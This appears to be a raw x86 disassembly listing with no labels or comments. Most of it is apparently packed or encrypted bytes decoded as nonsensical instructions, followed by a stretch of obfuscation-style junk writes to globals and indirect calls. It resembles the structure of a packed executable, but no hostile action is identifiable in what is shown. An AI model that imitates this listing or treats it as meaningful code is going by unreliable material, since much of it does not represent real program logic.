  402d29:	add    BYTE PTR [ebx+eax*2+0x36b17e17],cl
  402d30:	and    al,0xa2
  402d32:	cmp    eax,0x9030e070
  402d37:	aad    0x3c
  402d39:	in     eax,0xff
  402d3b:	push   ebp
  402d3c:	xor    DWORD PTR [edx-0x56de902],ecx
  402d42:	aam    0x46
  402d44:	push   ebp
  402d45:	jbe    0x402dbd
  402d47:	cli    
  402d48:	lahf   
  402d49:	xor    eax,0xa7d338c6
  402d4e:	jmp    0x402d3f
  402d50:	inc    DWORD PTR [ebp-0x2ab3c083]
  402d56:	paddq  mm4,QWORD PTR es:[ebx-0x6f]
  402d5b:	(bad)  
  402d5c:	xor    eax,0x837b6b86
  402d61:	in     eax,0x7d
  402d63:	sub    al,0x76
  402d65:	dec    esp
  402d66:	adc    DWORD PTR [ebx+edx*2-0x6f5936b4],0xffffff8d
  402d6e:	out    dx,al
  402d6f:	pop    ss
  402d70:	jne    0x402d36
  402d72:	data16 (bad) 
  402d74:	hlt    
  402d75:	retf   
  402d76:	cmc    
  402d77:	jo     0x402db8
  402d79:	pushf  
  402d7a:	sub    DWORD PTR [eax+0x5d],esp
  402d7d:	adc    eax,0x95e19f7
  402d82:	out    0xca,eax
  402d84:	cmp    ch,BYTE PTR [ebx+0x280f978f]
  402d8a:	mov    ebp,0xf2b981ca
  402d8f:	push   0x2a
  402d91:	sbb    esp,esp
  402d93:	gs daa 
  402d95:	push   edi
  402d96:	mov    fs,ecx
  402d98:	fnstsw WORD PTR [esi-0x3]
  402d9b:	mov    al,ds:0xb6ce4fbd
  402da0:	mov    al,0xe6
  402da2:	sub    eax,0x768a4f0
  402da7:	test   eax,0x420e524e
  402dac:	mov    al,BYTE PTR [edi+0x5e7859fd]
  402db2:	clc    
  402db3:	dec    eax
  402db4:	push   ecx
  402db5:	in     eax,dx
  402db6:	loope  0x402d75
  402db8:	gs mov dl,0xf0
  402dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dbc:	mov    ecx,gs
  402dbe:	popa   
  402dbf:	xlat   BYTE PTR ds:[ebx]
  402dc0:	add    al,0x26
  402dc2:	inc    esp
  402dc3:	xlat   BYTE PTR ds:[ebx]
  402dc4:	xchg   esi,eax
  402dc5:	ins    DWORD PTR es:[edi],dx
  402dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dc7:	pop    ds
  402dc8:	nop
  402dc9:	push   edx
  402dca:	sti    
  402dcb:	xor    al,0xf3
  402dcd:	mov    edx,0x2ed90fb4
  402dd2:	call   0x839adf8c
  402dd7:	mov    edx,0x9787df82
  402ddc:	add    eax,0x7f0c9cd7
  402de1:	cwde   
  402de2:	add    al,bl
  402de4:	rcr    DWORD PTR [ebp+0x79],0x94
  402de8:	test   al,0xfa
  402dea:	mov    esi,0x93c20fe2
  402def:	repz mov ch,0x2e
  402df2:	or     eax,0x3c5ea9e5
  402df7:	add    DWORD PTR [ebx],ebp
  402df9:	cmp    ah,cl
  402dfb:	sbb    bl,BYTE PTR [esi-0x79]
  402dfe:	lds    ebx,FWORD PTR [eax+0x7]
  402e01:	ret    
  402e02:	ds sub eax,0xf3251ef
  402e08:	stc    
  402e09:	lea    edx,[edi-0x3b9bde6a]
  402e0f:	rcl    ebp,0x11
  402e12:	pusha  
  402e13:	mov    ?,WORD PTR [edx-0x5afaecf4]
  402e19:	ins    BYTE PTR es:[edi],dx
  402e1a:	inc    bp
  402e1c:	adc    edx,DWORD PTR gs:[edx-0x4b]
  402e20:	mov    ds,WORD PTR [eax-0x12]
  402e23:	pop    ss
  402e24:	sbb    DWORD PTR [esi-0x6c],edx
  402e27:	mov    ah,0x25
  402e29:	pop    ebx
  402e2a:	jne    0x402eab
  402e2c:	repnz adc ecx,DWORD PTR [ebx-0x314e554f]
  402e33:	ficomp DWORD PTR [edi]
  402e35:	jl     0x402e6e
  402e37:	es lahf 
  402e39:	jno    0x402ea1
  402e3b:	lods   eax,DWORD PTR ds:[esi]
  402e3c:	test   DWORD PTR [esi-0x65],edx
  402e3f:	stos   BYTE PTR es:[edi],al
  402e40:	jge    0x402df5
  402e42:	das    
  402e43:	and    bh,BYTE PTR [ebx]
  402e45:	dec    esp
  402e46:	xchg   edx,eax
  402e47:	(bad)  
  402e48:	(bad)  
  402e49:	mov    dh,0xd6
  402e4b:	push   0x18
  402e4d:	or     BYTE PTR [eax-0x52d437df],cl
  402e53:	ret    0x1f1
  402e56:	xchg   ebp,eax
  402e57:	pop    edi
  402e58:	push   esp
  402e59:	in     eax,0xc8
  402e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e5c:	js     0x402ed7
  402e5e:	call   0x84d9:0x253d1f28
  402e65:	repnz imul esi,DWORD PTR [esi+0x1d0842b3],0xffffff89
  402e6d:	(bad)  [edx+0x9]
  402e70:	ret    0x73a4
  402e73:	jb     0x402e3a
  402e75:	dec    edi
  402e76:	int3   
  402e77:	(bad)  
  402e78:	lods   eax,DWORD PTR ds:[esi]
  402e79:	repz aad 0x91
  402e7c:	ret    
  402e7d:	mov    ah,0x98
  402e7f:	(bad)  [ebx+ebx*2-0x44]
  402e83:	inc    esi
  402e84:	fmul   DWORD PTR [edx]
  402e86:	outs   dx,DWORD PTR ds:[esi]
  402e87:	(bad)  
  402e88:	push   0xffffffb2
  402e8a:	mov    WORD PTR ds:0xc0c94d99,fs
  402e90:	add    ebp,DWORD PTR [edi]
  402e92:	in     al,dx
  402e93:	dec    BYTE PTR [ebx+0x5c7f445]
  402e99:	and    eax,0x88004282
  402e9e:	aas    
  402e9f:	add    BYTE PTR [eax],al
  402ea1:	mov    ecx,DWORD PTR [ebp+0x18]
  402ea4:	mov    edx,DWORD PTR [ebp+0x1c]
  402ea7:	mov    DWORD PTR ds:0x428199,0x78c8
  402eb1:	jg     0x403904
  402eb7:	jmp    0x403161
  402ebc:	pop    esi
  402ebd:	sbb    eax,0x1cb90efb
  402ec2:	outs   dx,DWORD PTR ds:[esi]
  402ec3:	mov    ebp,0x7131a4c5
  402ec8:	nop
  402ec9:	pushf  
  402eca:	jg     0x402f07
  402ecc:	fnstsw WORD PTR es:[ebx-0x44402f45]
  402ed3:	mov    ebx,0x9dc08d1
  402ed8:	outs   dx,BYTE PTR ds:[esi]
  402ed9:	out    dx,al
  402eda:	and    ebp,DWORD PTR [ecx+0x198d7c25]
  402ee0:	daa    
  402ee1:	out    0x11,eax
  402ee3:	cwde   
  402ee4:	pop    esi
  402ee5:	out    0xc0,eax
  402ee7:	adc    DWORD PTR [esi-0x4cd10598],eax
  402eed:	adc    al,0x1a
  402eef:	fwait
  402ef0:	xchg   esi,eax
  402ef1:	leave  
  402ef2:	xor    esp,edx
  402ef4:	mov    ch,0x8
  402ef6:	pusha  
  402ef7:	xchg   ebx,eax
  402ef8:	mov    esp,DWORD PTR [edx+0x41]
  402efb:	std    
  402efc:	loope  0x402f6d
  402efe:	inc    esi
  402eff:	iret   
  402f00:	pop    ds
  402f01:	add    bl,BYTE PTR [esi]
  402f03:	sahf   
  402f04:	add    eax,0xe92a7bf
  402f09:	aas    
  402f0a:	ins    DWORD PTR es:[edi],dx
  402f0b:	ret    
  402f0c:	mov    bl,0x88
  402f0e:	mov    al,BYTE PTR [ebx-0x2b]
  402f11:	ins    BYTE PTR es:[edi],dx
  402f12:	das    
  402f13:	adc    dl,bh
  402f15:	jl     0x402ee6
  402f17:	jb     0x402ea9
  402f19:	bound  edx,QWORD PTR [esi+0x59]
  402f1c:	jb     0x402f74
  402f1e:	jb     0x402f63
  402f20:	jno    0x402f6c
  402f22:	xchg   ecx,eax
  402f23:	adc    cl,BYTE PTR [ecx-0x48c1530e]
  402f29:	(bad)  
  402f2b:	push   ebp
  402f2c:	hlt    
  402f2d:	push   es
  402f2e:	enter  0x9358,0xbe
  402f32:	pop    ds
  402f33:	fbstp  TBYTE PTR [ebx]
  402f35:	inc    edx
  402f36:	in     eax,0xca
  402f38:	lods   al,BYTE PTR ds:[esi]
  402f39:	repnz cs pop es
  402f3c:	pop    es
  402f3d:	mov    esp,0x52addf1f
  402f42:	outs   dx,BYTE PTR ds:[esi]
  402f43:	jmp    0x5d204dc5
  402f48:	cmp    bl,BYTE PTR [eax+0x70b57c66]
  402f4e:	inc    ebp
  402f4f:	fdivr  DWORD PTR [ecx-0x76]
  402f52:	retf   0x2b97
  402f55:	stos   DWORD PTR es:[edi],eax
  402f56:	fisttp WORD PTR [esi+0x56]
  402f59:	sbb    ch,al
  402f5b:	mov    bh,BYTE PTR [edx]
  402f5d:	lock mov eax,0x2d71ab26
  402f63:	sahf   
  402f64:	dec    edi
  402f65:	loopne 0x402f11
  402f67:	(bad)  
  402f68:	mov    al,ds:0x7c80e501
  402f6d:	or     esi,DWORD PTR [ebx-0x60f3bff]
  402f73:	aad    0x2b
  402f75:	jae    0x402f77
  402f77:	xor    esi,edx
  402f79:	int3   
  402f7a:	or     dl,BYTE PTR [ebx+0x13421fbd]
  402f80:	rol    DWORD PTR [esi+edx*1-0x33],cl
  402f84:	(bad)  [ebp+0x67]
  402f87:	mov    bl,ah
  402f89:	pop    eax
  402f8a:	(bad)  
  402f8c:	and    BYTE PTR [ecx-0x70],ch
  402f8f:	mov    dl,0x5a
  402f91:	push   es
  402f92:	outs   dx,BYTE PTR ds:[esi]
  402f93:	ret    0x84ab
  402f96:	mov    DWORD PTR [ebp-0x3b],esi
  402f99:	xchg   BYTE PTR [ecx-0x5708ffd5],bh
  402f9f:	sahf   
  402fa0:	xor    ch,ch
  402fa2:	mov    bl,0xbb
  402fa4:	jne    0x402f5c
  402fa6:	retf   
  402fa7:	push   edi
  402fa8:	in     al,dx
  402fa9:	icebp  
  402faa:	call   0xed77c29b
  402faf:	adc    al,0x60
  402fb1:	push   ds
  402fb2:	add    ebp,DWORD PTR [esi+0x70da0ab3]
  402fb8:	(bad)  
  402fb9:	push   ds
  402fba:	pop    edx
  402fbb:	jg     0x403021
  402fbd:	xchg   dh,cl
  402fbf:	in     eax,0xc4
  402fc1:	inc    ecx
  402fc2:	in     eax,0xdd
  402fc4:	lods   al,BYTE PTR ds:[esi]
  402fc5:	or     al,0xe
  402fc7:	sahf   
  402fc8:	mov    ds,WORD PTR [ecx+0x5ce3ed9d]
  402fce:	sbb    eax,0xa2da3aeb
  402fd3:	push   ebp
  402fd4:	js     0x402fe7
  402fd6:	cld    
  402fd7:	sbb    al,0xde
  402fd9:	repz leave 
  402fdb:	add    ecx,DWORD PTR [edi]
  402fdd:	pop    esp
  402fde:	inc    ecx
  402fdf:	retf   0xd642
  402fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe3:	jmp    0xa371fc68
  402fe8:	les    edx,FWORD PTR [ecx+0x6739ae4]
  402fee:	iret   
  402fef:	rcr    BYTE PTR [eax],1
  402ff1:	scas   al,BYTE PTR es:[edi]
  402ff2:	dec    esi
  402ff3:	dec    edx
  402ff4:	(bad)  
  402ff5:	addr16 in eax,0xfb
  402ff8:	enter  0x6560,0xde
  402ffc:	fdiv   DWORD PTR [esi+0x3f7fe8cc]
  403002:	cmp    eax,0x7575d3e8
  403007:	out    dx,eax
  403008:	int3   
  403009:	xor    BYTE PTR [ecx],dl
  40300b:	ds inc esp
  40300d:	popa   
  40300e:	jae    0x40300f
  403010:	mov    bl,0xba
  403012:	mov    eax,0x55c3f2d6
  403017:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  403019:	arpl   WORD PTR [ecx-0x5545d584],bx
  40301f:	mov    bh,0xf1
  403021:	adc    BYTE PTR [ecx*4+0x37ecf256],0xdf
  403029:	adc    DWORD PTR [edi+0x29],esi
  40302c:	and    BYTE PTR [ecx],dh
  40302e:	inc    esi
  40302f:	fld    QWORD PTR [eax+ebx*4-0x552db656]
  403036:	ss sbb eax,0x8ab73c24
  40303c:	out    0x79,eax
  40303e:	pop    edx
  40303f:	(bad)  
  403040:	jge    0x40301a
  403042:	out    0x33,eax
  403044:	push   ebx
  403045:	sbb    DWORD PTR [edi-0x22b78730],ecx
  40304b:	mov    al,ds:0xba473b02
  403050:	pop    es
  403051:	mov    ds:0xe4534d7,eax
  403056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403057:	jmp    0xeb30:0x243cc152
  40305e:	cmp    BYTE PTR [ecx],bh
  403060:	repz test DWORD PTR [esi+0x1de4509e],edi
  403067:	lds    ecx,FWORD PTR [edx+0x4a72db47]
  40306d:	mov    WORD PTR [ecx+0x628cbd7f],?
  403073:	sub    cl,bh
  403075:	in     al,0x4
  403077:	pop    esp
  403078:	mov    eax,0x584a8528
  40307d:	fsub   QWORD PTR [ebx-0x7cab9d0e]
  403083:	lds    edi,FWORD PTR [esi-0x36]
  403086:	push   0x39
  403088:	add    BYTE PTR [edi+eax*8],dl
  40308b:	push   ebx
  40308c:	call   0x9c0e:0xd4b848d7
  403093:	xchg   edx,eax
  403094:	add    edi,ebx
  403096:	cli    
  403097:	stc    
  403098:	les    ebx,FWORD PTR [ebx+0x28]
  40309b:	push   es
  40309c:	xor    ah,al
  40309e:	mov    ebp,0x3affc2a6
  4030a3:	shr    BYTE PTR [eax+0x6e3ff16d],cl
  4030a9:	sbb    BYTE PTR ds:0x17466f36,dh
  4030af:	in     eax,0x1c
  4030b1:	pop    edx
  4030b2:	mov    esi,0x7ec8a39a
  4030b7:	xchg   edi,eax
  4030b8:	adc    bh,dl
  4030ba:	mov    cl,0xfa
  4030bc:	xor    eax,0xa8f0b9f
  4030c1:	stos   BYTE PTR es:[edi],al
  4030c2:	das    
  4030c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c4:	mov    esp,0xe1ba11cc
  4030c9:	stos   BYTE PTR es:[edi],al
  4030ca:	xchg   ebx,eax
  4030cb:	fs es and esi,ecx
  4030cf:	cmp    esp,ecx
  4030d1:	xchg   BYTE PTR [ebp+0x65dd9047],bl
  4030d7:	in     eax,dx
  4030d8:	mov    eax,ds:0x6bc517e2
  4030dd:	dec    eax
  4030de:	fisttp QWORD PTR [edx]
  4030e0:	inc    ecx
  4030e1:	dec    eax
  4030e2:	test   DWORD PTR [eax-0x8],0x72294507
  4030e9:	xor    edi,DWORD PTR [esi-0x19cf16a7]
  4030ef:	popw   ds
  4030f1:	pop    edi
  4030f2:	add    eax,ebx
  4030f4:	retf   
  4030f5:	out    0xae,eax
  4030f7:	push   ds
  4030f8:	sub    BYTE PTR [edx+0x3a],0xda
  4030fc:	ret    
  4030fd:	sbb    al,0x61
  4030ff:	cmc    
  403100:	sbb    edi,DWORD PTR [edx-0x141b0944]
  403106:	sahf   
  403107:	(bad)
  40310b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40310c:	addr16 cli 
  40310e:	sbb    al,BYTE PTR [esi+eax*4]
  403111:	leave  
  403112:	in     eax,0x73
  403114:	clc    
  403115:	xor    DWORD PTR [eax],0x61898188
  40311b:	(bad)  
  40311c:	in     eax,0xe0
  40311e:	cli    
  40311f:	retf   0xdec0
  403122:	out    dx,eax
  403123:	into   
  403124:	add    eax,0xba3592d1
  403129:	adc    eax,0x7e60c99e
  40312e:	cwde   
  40312f:	or     BYTE PTR ds:0xef2d4a57,bl
  403135:	mov    esp,DWORD PTR [ecx+ebp*1+0x58]
  403139:	cmp    ebp,DWORD PTR [ebx]
  40313b:	pusha  
  40313c:	push   ds
  40313d:	mov    eax,0xdbd192c5
  403142:	xor    DWORD PTR [edx+0x20],0x4c265b92
  403149:	es pop ebx
  40314b:	mov    esp,0x9952a94a
  403150:	sbb    al,0xa5
  403152:	mov    ds:0xac4cad74,al
  403157:	cdq    
  403158:	fwait
  403159:	inc    edi
  40315a:	and    BYTE PTR [ecx],dh
  40315c:	lea    eax,[edi]
  40315e:	jno    0x40313d
  403160:	mov    cl,0xf
  403162:	lods   al,BYTE PTR ds:[esi]
  403163:	rol    DWORD PTR [edx],1
  403165:	mov    DWORD PTR ds:0x42822d,0x2f6
  40316f:	jmp    0x403419
  403174:	xor    DWORD PTR [edi+0x58],0x7c
  403178:	mov    esp,0x64bda77d
  40317d:	sbb    edi,ebx
  40317f:	jno    0x403102
  403181:	aas    
  403182:	pop    ebx
  403183:	xor    DWORD PTR ds:0xd0bbbbe1,edi
  403189:	mov    edi,0xe40abbbb
  40318e:	dec    eax
  40318f:	inc    eax
  403190:	dec    esi
  403191:	mov    ah,0x20
  403193:	cli    
  403194:	cmp    esp,DWORD PTR [ebp-0x3f]
  403197:	inc    edi
  403198:	aas    
  403199:	adc    eax,0xe45dcfb
  40319e:	mov    al,0xc8
  4031a0:	and    ebp,edx
  4031a2:	pop    esp
  4031a3:	add    eax,DWORD PTR [edx-0x6c4e3f50]
  4031a9:	push   ds
  4031aa:	lods   al,BYTE PTR ds:[esi]
  4031ab:	mov    ebp,0x10681d5d
  4031b0:	data16 xor ch,BYTE PTR [ecx+ebp*2+0x44]
  4031b5:	mov    al,0x13
  4031b7:	dec    esi
  4031b8:	arpl   WORD PTR [ecx-0x2323e236],bx
  4031be:	(bad)  
  4031bf:	and    BYTE PTR [ebx-0x579e47b1],bh
  4031c5:	pushf  
  4031c6:	and    DWORD PTR [edi+0x6c],ebx
  4031c9:	jno    0x4031dd
  4031cb:	in     al,0xe0
  4031cd:	jno    0x4031dd
  4031cf:	mov    ah,0x6e
  4031d1:	es inc ecx
  4031d3:	hlt    
  4031d4:	mov    ch,0x8d
  4031d6:	pop    es
  4031d7:	xchg   ecx,eax
  4031d8:	clc    
  4031d9:	cdq    
  4031da:	mov    bl,0x36
  4031dc:	jmp    0x4031c8
  4031de:	fmul   DWORD PTR [ebx-0x58]
  4031e1:	adc    al,ch
  4031e3:	sbb    al,0x3b
  4031e5:	gs pop eax
  4031e7:	sub    al,BYTE PTR [edi+0x38f7560c]
  4031ed:	lods   eax,DWORD PTR ds:[esi]
  4031ee:	aaa    
  4031ef:	cmc    
  4031f0:	arpl   WORD PTR [edi+0x2751430a],sp
  4031f6:	clc    
  4031f7:	cmp    DWORD PTR [esi-0x3379f56e],ebp
  4031fd:	cmc    
  4031fe:	imul   ebx,esi,0x35e898ef
  403204:	inc    ebp
  403205:	cmp    DWORD PTR ds:0x2b8f7204,eax
  40320b:	sub    ebp,DWORD PTR [edx-0x22398957]
  403211:	lods   al,BYTE PTR ds:[esi]
  403212:	xchg   ebx,eax
  403213:	or     cl,BYTE PTR [eax+eax*1-0x2b]
  403217:	sub    DWORD PTR [ebx],esp
  403219:	xchg   dl,cl
  40321b:	into   
  40321c:	jnp    0x40324e
  40321e:	fndisi(8087 only) 
  403220:	les    ebx,FWORD PTR [ecx-0x3691551d]
  403226:	ss adc eax,0xf3981d18
  40322c:	add    dl,dh
  40322e:	or     eax,0x50edeeeb
  403233:	rcl    BYTE PTR [ecx],cl
  403235:	gs ins DWORD PTR es:[edi],dx
  403237:	in     al,0x18
  403239:	ins    BYTE PTR es:[edi],dx
  40323a:	push   ebx
  40323b:	mov    dl,0xba
  40323d:	in     al,dx
  40323e:	adc    DWORD PTR [ecx],0x6b
  403241:	pop    ss
  403242:	mov    eax,DWORD PTR [ebx-0xfcc9a30]
  403248:	jmp    0x6d93:0x59771f72
  40324f:	adc    esp,DWORD PTR [edi+0xc]
  403252:	fwait
  403253:	mov    ecx,DWORD PTR [ebx-0x6b8f0a0a]
  403259:	push   esp
  40325a:	idiv   ah
  40325c:	imul   ecx,DWORD PTR [esi-0x41f34eaa],0x9a7a81fb
  403266:	sti    
  403267:	lahf   
  403268:	mov    bh,bl
  40326a:	inc    ecx
  40326b:	cmp    bl,BYTE PTR [esp+edi*2]
  40326e:	dec    esi
  40326f:	icebp  
  403270:	ret    0xe4a8
  403273:	sub    dl,BYTE PTR [ecx+0x7d]
  403276:	xor    eax,0xfee66fe
  40327b:	gs jp  0x40323c
  40327e:	mov    dh,0x1e
  403280:	loope  0x4032ad
  403282:	je     0x403265
  403284:	inc    esi
  403285:	dec    eax
  403286:	sahf   
  403287:	sbb    eax,0x4c45dbfe
  40328c:	fbstp  TBYTE PTR [edi+0x42c3f050]
  403292:	aas    
  403293:	cdq    
  403294:	push   esi
  403295:	pop    ecx
  403296:	loop   0x40324e
  403298:	pop    edx
  403299:	mov    dl,0x67
  40329b:	and    eax,0xa945d761
  4032a0:	repnz xchg edx,eax
  4032a2:	jns    0x40327b
  4032a4:	cmp    esi,DWORD PTR [edx-0x1d6bfd49]
  4032aa:	inc    edi
  4032ab:	jp     0x4032e4
  4032ad:	mov    eax,DWORD PTR [edi+ecx*8-0x41]
  4032b1:	jno    0x40332b
  4032b3:	mov    ecx,0xf0810d93
  4032b8:	jecxz  0x403288
  4032ba:	test   BYTE PTR [ebp+0x7fc23ce4],cl
  4032c0:	jmp    0xf098:0xadb85c9f
  4032c7:	(bad)  
  4032c8:	lds    edi,FWORD PTR [esp+ecx*1+0x1a]
  4032cc:	mov    bl,0x6e
  4032ce:	and    eax,0x8544e072
  4032d3:	mov    esi,DWORD PTR [edi+0x4c]
  4032d6:	ins    BYTE PTR es:[edi],dx
  4032d7:	retw   
  4032d9:	xchg   DWORD PTR [eax+0x29],esi
  4032dc:	pop    esp
  4032dd:	pop    edx
  4032de:	into   
  4032df:	xlat   BYTE PTR ds:[ebx]
  4032e0:	fcom   QWORD PTR [edx+ecx*1]
  4032e3:	mov    bl,0xb2
  4032e5:	aam    0x2a
  4032e7:	mov    WORD PTR [ecx+0x9],fs
  4032ea:	lods   al,BYTE PTR ds:[esi]
  4032eb:	add    BYTE PTR [edi+0x47],bl
  4032ee:	in     eax,dx
  4032ef:	inc    ecx
  4032f0:	scas   eax,DWORD PTR es:[edi]
  4032f1:	(bad)  
  4032f2:	neg    DWORD PTR [edx]
  4032f4:	aad    0x1c
  4032f6:	xor    eax,0xf9f58816
  4032fb:	(bad)  
  4032fc:	mov    WORD PTR [ebx-0x28c71956],?
  403302:	hlt    
  403303:	or     DWORD PTR [ebp+0x1],0x68
  403307:	add    eax,0x9190dc6e
  40330c:	scas   eax,DWORD PTR es:[edi]
  40330d:	popa   
  40330e:	fnstsw WORD PTR [ebx-0x7f]
  403311:	sbb    esp,DWORD PTR [eax*2+0x33987262]
  403318:	xor    bl,dh
  40331a:	push   edx
  40331b:	nop
  40331c:	inc    edx
  40331d:	jmp    0x35f76d4a
  403322:	outs   dx,DWORD PTR ds:[esi]
  403323:	call   0xccae:0x119347f7
  40332a:	mov    esp,0x1c606cb1
  40332f:	mov    ds:0x8958e54b,al
  403334:	push   eax
  403335:	mov    BYTE PTR [ebx-0x72],dl
  403338:	retf   0x30d8
  40333b:	nop
  40333c:	mov    dh,0xe8
  40333e:	fwait
  40333f:	mov    ds:0xca9c3559,al
  403344:	jge    0x403344
  403346:	push   es
  403347:	clc    
  403348:	dec    esi
  403349:	ins    BYTE PTR es:[di],dx
  40334b:	push   ebx
  40334c:	fadd   QWORD PTR [edx+0x9]
  40334f:	cmp    eax,0xed457d72
  403354:	inc    eax
  403355:	pusha  
  403356:	mov    DWORD PTR [edi-0x7e637e63],esp
  40335c:	retf   0x1167
  40335f:	ss jle 0x40339a
  403362:	mov    ds:0x5a4b867,eax
  403367:	lea    ebp,[ecx-0x6630844e]
  40336d:	test   DWORD PTR [esi-0x7a8d6878],ebp
  403373:	pop    ebp
  403374:	xlat   BYTE PTR ds:[ebx]
  403375:	adc    al,0x64
  403377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403378:	push   esp
  403379:	enter  0xc9a5,0x84
  40337d:	ja     0x40339a
  40337f:	lds    ebx,FWORD PTR [edi+0x12077f2b]
  403385:	ret    0xb50a
  403388:	in     al,dx
  403389:	pop    ebx
  40338a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40338b:	sahf   
  40338c:	aam    0x1e
  40338e:	ret    0xe604
  403391:	xchg   ecx,eax
  403392:	lock sub dh,BYTE PTR [ecx]
  403395:	je     0x4033ec
  403397:	mov    eax,0x774a5fab
  40339c:	test   eax,edi
  40339e:	and    al,0xc
  4033a0:	inc    eax
  4033a1:	lea    esp,[edx-0x7a7a4154]
  4033a7:	cdq    
  4033a8:	retf   0xae6f
  4033ab:	add    dh,bh
  4033ad:	fdivr  DWORD PTR [edi-0x25]
  4033b0:	call   0x33f6:0x81bde205
  4033b7:	jle    0x4033a0
  4033b9:	lods   eax,DWORD PTR ds:[esi]
  4033ba:	ds jne 0x40335e
  4033bd:	js     0x4033d7
  4033bf:	and    esp,DWORD PTR [eax+esi*8+0x7965b27b]
  4033c6:	stos   BYTE PTR es:[edi],al
  4033c7:	xor    eax,0x4fea2890
  4033cc:	rol    BYTE PTR [eax+0x53f476ca],cl
  4033d2:	add    ah,ah
  4033d4:	iret   
  4033d5:	adc    eax,0x5bcf23f3
  4033da:	sahf   
  4033db:	mov    ch,0x5e
  4033dd:	scas   al,BYTE PTR es:[edi]
  4033de:	sbb    al,0x26
  4033e0:	xor    edx,DWORD PTR [edi]
  4033e2:	adc    BYTE PTR [ecx+0x4e],cl
  4033e5:	fmul   QWORD PTR [edi]
  4033e7:	sub    dh,dh
  4033e9:	loope  0x403460
  4033eb:	jp     0x4033b4
  4033ed:	aam    0xf9
  4033ef:	mov    DWORD PTR [esi-0x33],ebp
  4033f2:	xor    ebp,DWORD PTR [edi+0xf]
  4033f5:	out    0x2,eax
  4033f7:	push   ecx
  4033f8:	vsubsd xmm1,xmm4,QWORD PTR [ecx+0x38ee5927]
  403400:	fwait
  403401:	aam    0xc8
  403403:	mov    esp,0xb5b79538
  403408:	dec    ecx
  403409:	loopne 0x4033ac
  40340b:	lds    ecx,FWORD PTR [esi+ecx*1-0x17]
  40340f:	xor    eax,0x17bd5ac9
  403414:	mov    ah,0xe7
  403416:	rcr    DWORD PTR [edi-0x1bb276f7],0x8b
  40341d:	dec    ebp
  40341e:	sbb    BYTE PTR [ecx+0x4282412d],al
  403424:	add    BYTE PTR ds:0x31000013,al
  40342a:	jge    0x403410
  40342c:	xor    DWORD PTR ds:0x428281,0x43b
  403436:	shl    ecx,0x1e
  403439:	not    DWORD PTR ds:0x42822d
  40343f:	xor    ecx,ecx
  403441:	and    DWORD PTR ds:0x42826d,0x428239
  40344b:	or     ecx,DWORD PTR [ebp-0x1c]
  40344e:	shr    edx,0x2
  403451:	cmp    DWORD PTR ds:0x428225,0x0
  403458:	mov    edx,0x681
  40345d:	mov    edx,0x7002
  403462:	mov    DWORD PTR ds:0x428199,0xaff
  40346c:	jmp    0x4034be
  403471:	mov    DWORD PTR ds:0x428195,edi
  403477:	cmp    DWORD PTR ds:0x428225,0x0
  40347e:	jg     0x40349f
  403484:	push   0x4a83
  403489:	call   DWORD PTR ds:0x4289c4
  40348f:	sub    edx,0x3993
  403495:	adc    DWORD PTR ds:0x428209,0x4c37
  40349f:	mov    edx,DWORD PTR ds:0x4282c1
  4034a5:	adc    DWORD PTR ds:0x428271,edx
  4034ab:	movzx  edx,BYTE PTR ds:0x428229
  4034b2:	xor    edx,DWORD PTR ds:0x4282b1
  4034b8:	mov    DWORD PTR ds:0x428229,edx
  4034be:	mov    edx,DWORD PTR [ebp+0x1c]
  4034c1:	cmp    DWORD PTR ds:0x428205,0x0
  4034c8:	mov    edx,DWORD PTR ds:0x428229
  4034ce:	mov    DWORD PTR ds:0x4281b1,0x7142
  4034d8:	mov    DWORD PTR ds:0x428209,0x48e3
  4034e2:	jmp    0x403549
  4034e7:	mov    DWORD PTR ds:0x428209,0x6b6c
  4034f1:	mov    DWORD PTR ds:0x428271,0x645
  4034fb:	cmp    DWORD PTR ds:0x428205,0x0
  403502:	jne    0x403527
  403508:	push   DWORD PTR [ebp-0x14]
  40350b:	push   0x4879
  403510:	push   0x7982
  403515:	call   DWORD PTR ds:0x428aa8
  40351b:	adc    DWORD PTR ds:0x42823d,0x534f
  403525:	neg    edx
  403527:	mov    edx,DWORD PTR ds:0x42825d
  40352d:	mov    edx,DWORD PTR [edx]
  40352f:	sbb    DWORD PTR ds:0x42820d,edx
  403535:	sbb    DWORD PTR ds:0x428225,0x4281ad
  40353f:	mov    DWORD PTR ds:0x428235,0x7b71
  403549:	mov    DWORD PTR [ebp-0x2c],ecx
  40354c:	add    DWORD PTR ds:0x4281a1,0x7ae3
  403556:	mov    ecx,DWORD PTR [ebx]
  403558:	mov    edx,DWORD PTR [ebx+0x4]
  40355b:	or     DWORD PTR ds:0x4282c1,0x6c06
  403565:	shrd   ecx,edx,0x2
  403569:	shr    edx,0x2
  40356c:	mov    edx,DWORD PTR ds:0x4281c5
  403572:	mov    edx,DWORD PTR [edx]
  403574:	xor    DWORD PTR ds:0x428205,edx
  40357a:	mov    DWORD PTR [ebp-0x1c],ecx
  40357d:	cmp    DWORD PTR ds:0x4282c9,0x0
  403584:	mov    DWORD PTR ds:0x4282b9,0x2ae3
  40358e:	movzx  edx,BYTE PTR ds:0x428289
  403595:	mov    edx,DWORD PTR ds:0x4282d1
  40359b:	jmp    0x403603
  4035a0:	mov    DWORD PTR ds:0x428241,0x4de5
  4035aa:	cmp    DWORD PTR ds:0x4282c9,0x0
  4035b1:	jbe    0x4035eb
  4035b7:	push   DWORD PTR [ebp-0x24]
  4035ba:	push   DWORD PTR [ebp-0x28]
  4035bd:	push   DWORD PTR [ebp-0x14]
  4035c0:	push   0x47d5
  4035c5:	push   DWORD PTR [ebp-0x1c]
  4035c8:	push   DWORD PTR [ebp-0xc]
  4035cb:	call   DWORD PTR ds:0x428aac
  4035d1:	sub    DWORD PTR ds:0x428209,0x7ffc
  4035db:	sbb    DWORD PTR ds:0x428219,0x3999
  4035e5:	or     DWORD PTR ds:0x42823d,edi
  4035eb:	adc    DWORD PTR ds:0x428215,0x7e6c
  4035f5:	sub    edx,ecx
